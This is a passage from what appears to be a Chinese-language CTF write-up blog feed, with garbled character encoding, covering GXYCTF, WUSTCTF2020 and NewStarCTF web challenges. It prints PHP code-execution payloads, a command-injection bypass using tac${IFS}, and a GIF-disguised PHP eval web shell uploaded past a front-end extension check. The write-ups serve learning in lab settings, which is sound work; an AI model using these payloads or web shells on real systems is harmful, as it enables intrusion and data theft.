class="hljs-comment">//ä½œç”¨æ˜¯è·å–å½“å‰ä¼šè¯çš„ID,ä¹Ÿå°±æ˜¯cookieä¸­çš„phpsessionï¼Œè¿™é‡Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œphpsessionä¸­åªå…è®¸å‡ºç° a-z A-Z 0-9 , - ç­‰å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œå¯ä»¥å…ˆå°†å…¶16è¿›åˆ¶ç¼–ç åå†æ’å…¥ã€‚</span><br>æµ‹è¯•ä»£ç ï¼š<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å‚è€ƒäº†novic4å¸ˆå‚…çš„æ–‡ç« </span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/tw13.png" alt="tw13"></p><p>æ³¨æ„è¿™ä¸ªhex2binï¼Œä»–æ˜¯å­—ç¬¦ä¸²è½¬å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å­—è½¬æ•°å­—ã€‚</p><p>ç°åœ¨æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼š<code>phpsession</code>å¤´çš„å€¼æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå…ˆé€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>æŠŠæˆ‘ä»¬éœ€è¦çš„æ¶æ„ä»£ç ç¿»å‡ºæ¥ï¼Œç„¶åæŠŠå®ƒä¼ ç»™expå‚æ•°å°±è¡Œäº†(æ³¨æ„è¦æŠŠæ¶æ„ä»£ç è½¬æˆåå…­è¿›åˆ¶ï¼)ï¼š</p><p><code>å› ä¸ºæˆ‘åˆ°ç°åœ¨è¿˜æ²¡æ•´æ˜ç™½æ€ä¹ˆç”¨burpsuiteæŠ“æœ¬åœ°åŒ…ï¼Œæ‰€ä»¥ä¸‹é¢çš„å›¾å‚è€ƒäº†novic4å¸ˆå‚…çš„å›¾ï¼Œå†æ¬¡æ„Ÿè°¢ï¼</code></p><p><img src="/img/tw14.png" alt="tw14"></p><p>ç°åœ¨å›åˆ°è¿™ä¸ªå¥—å¨ƒé¢˜ï¼Œå·²çŸ¥è¿‡æ»¤äº†<code>et</code>ï¼Œ<code>hex</code>ç­‰ï¼Œä¼¼ä¹ä¸Šé¢ä¸‰ç§æ–¹æ³•éƒ½ç”¨ä¸äº†äº†ã€‚ã€‚ã€‚</p><p>çœ‹äº†å¸ˆå‚…ä»¬çš„wpï¼Œç¬¬ä¸€ä¸ªpayloadè¿™ä¹ˆå†™ï¼š</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>å…ˆçœ‹çœ‹è¿™ä¸ª<code>localeconv()</code>è¿”å›äº†ä»€ä¹ˆä¸œè¥¿ï¼š</p><p><img src="/img/tw17.png" alt="tw17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/tw15.png" alt="tw15"></p><p>ç¬¬ä¸€é¡¹è¿”å›äº†æˆ‘ä»¬æƒ³è¦çš„<code>.</code>ã€‚å†åˆ©ç”¨<code>current</code>è¿”å›ä¸€ç»´æ•°ç»„ç¬¬ä¸€é¡¹çš„å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw16.png" alt="tw16"></p><p>æ³¨æ„è¿™é‡Œå’Œå‰é¢é‚£ä¸ª<code>get_defined_vars</code>åŒºåˆ†å¼€ï¼Œäººå®¶è¿”å›çš„æ˜¯å¤šç»´æ•°ç»„ï¼Œç°åœ¨æˆ‘ä»¬åªè¿”å›äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥<code>current</code>ååªæœ‰ä¸€ä¸ªç‚¹ã€‚</p><p><code>scandir(&#39;.&#39;)</code>è¿™ä¸œè¥¿ä¼šä»¥æ•°ç»„å½¢å¼è¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw18.png" alt="tw18"></p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å…ˆé€šè¿‡<code>/?exp=var_dump(scandir(current(localeconv())));</code>çœ‹çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½æœ‰å•¥(var_dumpä¹Ÿèƒ½ç”¨<code>print_r</code>ç­‰ä»£æ›¿ï¼š</p><p><img src="/img/tw19.png" alt="tw19"></p><p>å¯ä»¥çœ‹åˆ°å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶å°±æ˜¯flag.phpäº†ï¼Œæ„é€ payload:</p><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p>å› ä¸º<code>flag.php</code>åœ¨å€’æ•°ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥å…ˆ<code>array_reverse</code>æŠŠå®ƒè½¬æˆæ­£æ•°ç¬¬äºŒä¸ªï¼Œç„¶å<code>next</code>å°†æŒ‡é’ˆå‘ä¸‹ç§»åŠ¨ç›´æ¥æå–ç¬¬äºŒä¸ª(å‰é¢çš„<code>current</code>å°†æŒ‡é’ˆæ”¾åœ¨é¦–ä½)ã€‚</p><p><img src="/img/tw20.png" alt="tw20"></p><p>ä¹Ÿå¯ä»¥ç”¨<code>highlight_file()</code>å‡½æ•°æ›¿æ¢ï¼Œä»–ä¿©å·®ä¸å¤šã€‚</p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œæ¯”å¦‚è¿™ä¸ªflag.phpçš„ä½ç½®ä¸ç‰¹æ®Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">å¦‚æœflag.phpçš„ä½ç½®ä¸ç‰¹æ®Šï¼Œå¯ä»¥ä½¿ç”¨<span class="hljs-title function_ invoke__">array_rand</span>()å’Œ<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…<span class="hljs-title function_ invoke__">array_flip</span>()æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œå‡½æ•°ä½œç”¨ä¸Šé¢æœ‰å†™åˆ°)æ¥éšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹ï¼Œåˆ·å‡ æ¬¡å°±å‡ºæ¥äº†ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µpayloadï¼š<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-title function_ invoke__">array_rand</span>()è¿™ä¸œè¥¿ä¼šè¿”å›éšæœºä¸€ä¸ªé”®åï¼Œ<span class="hljs-title function_ invoke__">array_flip</span>()ç”¨äºäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼Œè¿™ä¸¤ä¸ªç»„åˆä¸€ä¸‹å°±ä¼šè·å¾—éšæœºçš„ä¸€ä¸ªé”®å€¼ã€‚å› ä¸ºè¿™ä¸œè¥¿å®Œå…¨éšæœºçš„ï¼Œæ‰€ä»¥å¤šåˆ·æ–°å‡ æ¬¡æ‰å¯èƒ½ä¼šå‡ºç°flagï¼    <br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•ä½¿ç”¨session_idï¼š</p><p>ä¸è¿‡æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†<code>hex</code>ï¼Œå‰é¢çš„<code>eval(hex2bin(session_id(session_start())));</code>è‚¯å®šæ²¡æ³•ç”¨äº†ï¼Œä¸è¿‡å¸ˆå‚…çš„åšå®¢é‡Œè¯´<code>PHPSESSIID</code>è¿™ä¸œè¥¿å¯ä»¥ç›´æ¥ç»™ä»–èµ‹å€¼<code>flag.php</code>ï¼š</p><p>payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>å¹¶åŠ ä¸ª<code>cookie</code>å¤´ï¼š<code>cookie:PHPSESSID=flag.php</code></p><p><img src="/img/tw21.png" alt="tw21"></p><p>ä»¥ä¸Šå†…å®¹å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ã€‚ã€‚</p><p><img src="/img/pswh1.png" alt="pswh1"></p><p>ç¡®å®å’Œé¢˜ç›®å¯¹åº”äº†ï¼Œå“ˆå“ˆã€‚ä»–è¿™ä¸ªæŠ¥é”™å¥½åƒæ˜¯ä¸ª</p><p>ä¸çŸ¥é“å¹²å•¥å°±ç”¨dirsearchæ‰«ï¼š<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>Kaliä¸‹ä¸ç”¨åŠ åé¢é‚£ä¸€ä¸²ï¼š<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p><p>æ‰«å‡ºæ¥ä¸¤ä¸ªä¸œè¥¿ï¼š<code>index.php</code>å’Œ<code>robots.txt</code>ï¼Œè®¿é—®<code>robots.txt</code>ï¼š</p><p><img src="/img/pswh2.png" alt="pswh2"></p><p><code>index.php</code>å°±æ˜¯è¿›å»è¿™ä¸ªç•Œé¢ï¼Œè®¿é—®ä¸‹è¿™ä¸ª<code>fAke_f1agggg.php</code>:</p><p><img src="/img/pswh3.png" alt="pswh3"></p><p>:(ï¼ŒburpsuiteæŠ“åŒ…çœ‹çœ‹ä»€ä¹ˆæƒ…å†µï¼š</p><p><img src="/img/pswh4.png" alt="pswh4"></p><p>èŠœæ¹–ï¼Œå“åº”åŒ…é‡Œæœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š<code>fl4g.php</code>ï¼Œç›´æ¥è®¿é—®ï¼š</p><p><img src="/img/pswh5.png" alt="pswh5"></p><p>è¿™é‡Œå‘ç°ä¸ªé—®é¢˜ï¼šé¡µé¢è¿”å›ä¸€å †ä¹±ç ï¼Œä½†æ˜¯æ”¾burpsuiteçš„repeateræ¨¡å—é‡Œçœ‹åˆä¸å­˜åœ¨ï¼Œå’Œä¸Šé¢é‚£æ®µ<code>php</code>æŠ¥é”™æœ‰å…³ç³»ï¼Ÿä¸å¤ªæ‡‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//numç»è¿‡intvalåè¦å°äº2020ï¼ŒåŠ 1å†inntvalè¦å¤§äº2021ï¼Œç›´æ¥ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼š2e4ï¼Œå³/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5å¼±ç­‰äºå…¶md5åŠ å¯†åï¼Œå¼±ç­‰äºæ˜¯å…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒå†æ¯”è¾ƒã€‚è½¬æ¢çš„è§„åˆ™ä¸ºï¼Œè‹¥è¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚æ‰¾ä¸ªåŠ å¯†å‰0eå¼€å¤´åŠ å¯†åä»ä¸º0eçš„å°±è¡Œäº†</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flagä¸­ä¸èƒ½æœ‰ç©ºæ ¼</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplaceå‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>cat</code>ï¼Œç»•è¿‡å§¿åŠ¿å¤ªå¤šäº†ã€‚ã€‚<code>ca&#39;&#39;t</code>è¿˜æœ‰<code>tac</code>å•¥çš„éƒ½å¯ä»¥ã€‚å…ˆ<code>ls</code>çœ‹çœ‹å½“å‰ç›®å½•éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week1</title>
    <link href="/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/"/>
    <url>/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬ä¸€å‘¨</p><span id="more"></span><hr><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p>é¢˜ç›®æè¿°ï¼šç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹</p><p>è¿™é¢˜ä¸€å¼€å§‹æƒ³ç”¨dirsearchæ‰«çš„ï¼Œä½†æ˜¯å«Œæ—¶é—´å¤ªé•¿äº†å°±ç›´æ¥è¯•äº†ä¸€äº›æˆ‘çŸ¥é“çš„æ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt <span class="hljs-comment">//å‘Šè¯‰çˆ¬è™«å•¥èƒ½çˆ¬å•¥ä¸èƒ½çˆ¬ï¼Œä¸è¿‡æ²¡å•¥ç”¨ï¼Œè¿™ç©æ„å„¿å°±åƒé˜²ç›—é—¨ä¸€æ ·ï¼ŒçœŸæƒ³å·ä¸œè¥¿çš„äººæ‰ä¸ä¼šç®¡ä½ ä¸Šæ²¡ä¸Šé”</span><br>www.zip <span class="hljs-comment">//å­˜ç½‘ç«™å¤‡ä»½æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>VIMå’ŒGitæ³„éœ²æ²¡æœ‰ï¼Œå°±è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½å†æ‰“å¼€æ‹¼ä¸€èµ·å°±æ˜¯flagäº†ã€‚</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>é¢˜ç›®æè¿°ï¼šæ™®é€šçš„ä¸Šä¼ å•¦ï¼Œå¹³å¹³æ·¡æ·¡æ‰æ˜¯çœŸ</p><p><img src="/img/a9.png" alt="a9"></p><p>çœ‹çœ‹æºç æœ‰å•¥å¥½ä¸œè¥¿æ²¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;file&quot;</span>);<br>            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>];<br>            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();<br>            <br>            <span class="hljs-keyword">if</span> (!file) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;é”™è¯¯çš„æ‹“å±•åï¼Œåªå…è®¸ä¸Šä¼ : JPG, JPEG, PNG, GIF&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>é™åˆ¶äº†åç¼€ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡ã€‚ä¼°è®¡æ˜¯å‰ç«¯éªŒè¯ï¼Ÿé‚£å°±ä¸Šä¼ ä¸ªä¸€å¥è¯æ”¹æˆå›¾ç‰‡æ ¼å¼ï¼ŒburpsuiteæŠ“ä¸ªåŒ…å†æ”¹å›å»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GIF89a<br><br><span class="hljs-meta">&lt;?php</span><br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;viper&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/a10.png" alt="a10"></p><p>å†æ”¹æˆphpåç¼€å°±å¥½äº†ï¼Œä¸Šä¼ è·¯å¾„ç›´æ¥æ˜¾ç¤ºå†ç•Œé¢äº†ã€‚</p><p><img src="/img/a11.png" alt="a11"></p><p>ç„¶åç›´æ¥èšå‰‘è¿ï¼Œæ ¹ç›®å½•åº•ä¸‹æ‹¿flagã€‚</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>é¢˜ç›®æè¿°ï¼šæœ€åˆçš„å¼€å§‹</p><p>mdè¯´ä¸€å˜´è¿™é¢˜æœ€åä¸€æ­¥é™åˆ¶æœ¬åœ°ç”¨æˆ·æ‰èƒ½è®¿é—®å¡äº†æˆ‘è›®ä¹…ã€‚ã€‚å› 